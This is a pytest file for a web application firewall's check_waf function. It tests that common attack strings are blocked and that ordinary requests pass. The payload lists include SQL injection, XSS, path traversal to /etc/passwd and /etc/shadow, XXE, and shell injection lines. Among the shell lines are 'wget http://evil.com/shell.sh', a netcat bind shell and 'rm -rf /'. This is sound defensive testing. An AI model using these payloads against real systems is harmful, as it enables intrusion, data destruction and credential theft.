"""
WAF (Web Application Firewall) pattern detection tests.
Tests the built-in regex patterns that protect against common attacks.
"""
import sys
import os
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from proxy import check_waf


# ═══════════════════════════════════════════════════════════════════════════════
# SQL Injection Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestSQLInjection:
    """Verify the WAF blocks SQL injection attempts."""

    @pytest.mark.parametrize("payload", [
        "1' OR '1'='1' --",
        "' OR 1=1 --",
        "1; DROP TABLE users--",
        "' UNION SELECT * FROM users--",
        "1' UNION ALL SELECT NULL,NULL,NULL--",
        "admin'--",
        "' OR 'a'='a",
        "1' AND 1=1",
        "'; EXEC xp_cmdshell('dir')--",
        "1'; INSERT INTO users VALUES('hacked')--",
        "SELECT * FROM users WHERE id=",
        "exec(sp_executesql)",
    ])
    def test_blocks_sqli_payloads(self, payload):
        """Each SQLi payload should be detected and blocked."""
        assert check_waf(payload, "/api/test", "") is True, f"SQLi payload not blocked: {payload}"

    def test_sqli_in_query_params(self):
        """SQLi in query string should be blocked."""
        assert check_waf("", "/api/users", "id=1' OR '1'='1' --") is True

    def test_sqli_in_path(self):
        """SQLi in URL path should be blocked."""
        assert check_waf("", "/api/users/1'; DROP TABLE users--", "") is True


# ═══════════════════════════════════════════════════════════════════════════════
# XSS (Cross-Site Scripting) Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestXSS:
    """Verify the WAF blocks cross-site scripting attempts."""

    @pytest.mark.parametrize("payload", [
        "<script>alert('xss')</script>",
        "<script>document.cookie</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('xss')>",
        "<body onload=alert('xss')>",
        "javascript:alert('xss')",
        "vbscript:alert('xss')",
        "data:text/html,<script>alert(1)</script>",
        "<iframe src='javascript:alert(1)'>",
        "<object data='javascript:alert(1)'>",
        "<embed src='data:text/html,<script>alert(1)</script>'>",
        "<div onmouseover=alert(1)>hover me</div>",
        "<a href='javascript:alert(1)'>click</a>",
    ])
    def test_blocks_xss_payloads(self, payload):
        """Each XSS payload should be detected and blocked."""
        assert check_waf(payload, "/api/search", "") is True, f"XSS payload not blocked: {payload}"

    def test_xss_in_query_params(self):
        """XSS in query string should be blocked."""
        assert check_waf("", "/api/search", "q=<script>alert(1)</script>") is True


# ═══════════════════════════════════════════════════════════════════════════════
# Path Traversal Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestPathTraversal:
    """Verify the WAF blocks path traversal attempts."""

    @pytest.mark.parametrize("payload", [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/dev/null",
        "/proc/self/cmdline",
    ])
    def test_blocks_path_traversal(self, payload):
        """Each path traversal payload should be blocked."""
        assert check_waf("", payload, "") is True, f"Path traversal not blocked: {payload}"

    def test_path_traversal_in_body(self):
        """Path traversal in request body should be blocked."""
        assert check_waf("../../etc/passwd", "/api/files", "") is True


# ═══════════════════════════════════════════════════════════════════════════════
# Command Injection Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestCommandInjection:
    """Verify the WAF blocks command injection attempts."""

    @pytest.mark.parametrize("payload", [
        "; ls -la",
        "| cat /etc/passwd",
        "; rm -rf /",
        "| wget http://evil.com/shell.sh",
        "`whoami`",
        "$(whoami)",
        "; curl http://evil.com",
        "| bash",
        "; python -c 'import os; os.system(\"id\")'",
        "| nc -l -p 4444 -e /bin/bash",
        "; perl -e 'system(\"id\")'",
    ])
    def test_blocks_command_injection(self, payload):
        """Each command injection payload should be blocked."""
        assert check_waf(payload, "/api/exec", "") is True, f"Command injection not blocked: {payload}"

    def test_command_injection_in_body(self):
        """Command injection in JSON body should be blocked."""
        assert check_waf('{"cmd": "ls; rm -rf /"}', "/api/exec", "") is True


# ═══════════════════════════════════════════════════════════════════════════════
# LDAP Injection Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestLDAPInjection:
    """Verify the WAF blocks LDAP injection attempts."""

    @pytest.mark.parametrize("payload", [
        "admin)(&(password=*))",
        "(|(uid=*)(objectClass=*))",
        ")(uid=*))(&(uid=*",
        "(&(cn=*)(objectClass=user))",
    ])
    def test_blocks_ldap_injection(self, payload):
        """Each LDAP injection payload should be blocked."""
        assert check_waf(payload, "/api/auth", "") is True, f"LDAP injection not blocked: {payload}"


# ═══════════════════════════════════════════════════════════════════════════════
# XXE (XML External Entity) Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestXXE:
    """Verify the WAF blocks XXE injection attempts."""

    @pytest.mark.parametrize("payload", [
        '<!DOCTYPE foo SYSTEM "file:///etc/passwd">',
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    ])
    def test_blocks_xxe(self, payload):
        """Each XXE payload should be blocked."""
        assert check_waf(payload, "/api/upload", "") is True, f"XXE not blocked: {payload}"


# ═══════════════════════════════════════════════════════════════════════════════
# Legitimate Requests — MUST PASS THROUGH
# ═══════════════════════════════════════════════════════════════════════════════

class TestLegitimateRequests:
    """Verify legitimate requests are NOT blocked (false positives)."""

    @pytest.mark.parametrize("body,path,query,desc", [
        ("", "/api/users/42", "", "Simple GET by ID"),
        ('{"name": "John Doe", "email": "john@example.com"}', "/api/users", "", "Create user JSON"),
        ("", "/api/products?category=electronics", "category=electronics", "Filter by category"),
        ('{"query": "show me items in the menu"}', "/api/search", "", "Normal search with word 'select'"),
        ("", "/api/orders/123/status", "", "Order status check"),
        ("", "/api/v2/users?page=1&limit=10", "page=1&limit=10", "Paginated list"),
        ("", "/api/auth/login", "", "Login endpoint"),
        ('{"name": "O\'Brien"}', "/api/users", "", "Name with apostrophe (not injection)"),
        ("", "/api/data/latest", "", "Normal path"),
        ('{"text": "The price is 1.99 or 2.49 each"}', "/api/calculate", "", "Numbers with dots"),
        ("", "/api/html-content", "", "Path with hyphen"),
    ])
    def test_legitimate_request_passes(self, body, path, query, desc):
        """Legitimate requests should NOT be blocked by WAF."""
        result = check_waf(body, path, query)
        assert result is False, f"False positive: {desc} was blocked (body={body!r}, path={path!r}, query={query!r})"


# ═══════════════════════════════════════════════════════════════════════════════
# Combined Input Tests
# ═══════════════════════════════════════════════════════════════════════════════

class TestCombinedInput:
    """Test WAF detection when malicious payload is split across body/path/query."""

    def test_sqli_in_body_safe_path(self):
        """SQLi in body should be caught even with safe path."""
        assert check_waf("1' OR '1'='1' --", "/api/users", "") is True

    def test_xss_in_query_safe_body(self):
        """XSS in query should be caught even with empty body."""
        assert check_waf("", "/api/search", "<script>alert(1)</script>") is True

    def test_all_clean(self):
        """All clean inputs should not be flagged."""
        assert check_waf('{"data": "hello"}', "/api/items", "sort=asc") is False

    def test_empty_input(self):
        """Empty input should not be flagged."""
        assert check_waf("", "/", "") is False
